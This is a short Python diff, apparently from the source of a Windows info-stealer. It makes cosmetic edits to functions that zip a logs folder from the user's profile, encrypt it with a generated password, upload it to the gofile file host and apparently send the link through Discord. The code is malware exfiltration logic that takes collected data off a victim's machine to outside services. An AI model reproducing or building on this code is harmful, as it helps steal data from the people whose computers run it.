@@ -22,7 +22,9 @@ def upload_file_to_gofile(file_path):
             if response.status_code == 200: return response.json()["data"]["downloadPage"]
             else: raise Exception("Failed to upload file")
         
-    except Exception as e: return e
+    except Exception as e:
+        Log(e)
+        return e
 
 def MakeZip(user):
     Temp = environ['USERPROFILE'] + sep + r'AppData\Local\Temp'
@@ -40,9 +42,9 @@ def MakeZip(user):
         make_archive(fr'{Temp}\logs', 'zip', f'{user}\\{config.pathToLogs}')
         with AESZipFile(f'{name}.zip','w',compression=ZIP_STORED,encryption=WZ_AES) as logs:
             logs.setpassword(password)
-            logs.write(r'logs.zip')
+            logs.write("logs.zip")
         remove("logs.zip")
-        return[f"{Temp}/{name}.zip",pwd_str]
+        return[f"{Temp}/{name}.zip", pwd_str]
     except Exception as e:
         Log(f"MakeZip ---> {e}")
         return None
@@ -67,7 +69,7 @@ def MsgForDiscord(message, url) -> str:
 
 
 
-def Send(sendData, msgInfo):
+def Send(sendData, msgInfo) -> None:
     user = environ['USERPROFILE']
     zipInfo = []
     url = None
